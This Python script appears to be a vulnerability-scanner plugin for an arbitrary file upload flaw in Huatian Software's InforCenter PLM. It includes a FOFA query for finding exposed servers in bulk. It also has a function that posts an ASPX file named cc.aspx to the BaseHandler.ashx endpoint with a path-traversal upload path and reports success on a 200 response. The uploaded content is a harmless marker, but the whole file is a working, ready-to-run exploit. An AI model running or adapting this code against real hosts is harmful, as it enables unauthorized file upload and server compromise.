"""
name: 华天软件Inforcenter
CVE编号:
fofa 搜索: body="/Base/BaseHandler.ashx"
漏洞类型: 任意文件上传
InforCenter PLM是面向制造业产品全生命周期管理业务过程，旨在为企业提供从需求收集、产品设计、工艺设计到车间生产的智能制造管理平台。华天软件Inforcenter PLM uploadFileTolls接口存在任意文件上传漏洞
"""
import os.path
import sys
from src import api, utils
from urllib.parse import urljoin

__all__ = [
    "search",
    "start"
]


def search(email, key):
    fofa = api.FOFA(email=email, key=key)
    result = fofa.search('body="/Base/BaseHandler.ashx"')
    return fofa.add_url(result)


def start(host, *args, **kwargs):
    """
    InforCenter PLM是面向制造业产品全生命周期管理业务过程，旨在为企业提供从需求收集、产品设计、工艺设计到车间生产的智能制造管理平台。华天软件Inforcenter PLM uploadFileTolls接口存在任意文件上传漏洞
    :param host: 目标地址
    :param args:
    :param kwargs:
    :return:
    """
    url = urljoin(host, "/Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/")

    input_str = "62CYP5GMbgee"
    binary_str = ' '.join(format(byte, '08b') for byte in input_str.encode('utf-8'))
    headers = {
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=fd57033fc7f6ea1b5a2104f51d18c308"

    }
    files = {
        "file": ("cc.aspx", binary_str, "image/jpeg")
    }

    try:
        response = utils.requests_url(url=url, method='post', files=files, timeout=8, headers=headers, *args, **kwargs)

        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False


if __name__ == '__main__':
    vuln_name = os.path.basename(__file__).split('.')[0]
    if len(sys.argv) < 2:
        print(f"python <{vuln_name}> <host>")
        sys.exit()
    parameter = sys.argv[1]
    r_type = start(parameter)
    if r_type:
        print(f"{parameter} vuln {vuln_name}: True")
    else:
        print(f"{parameter} vuln {vuln_name}: False")
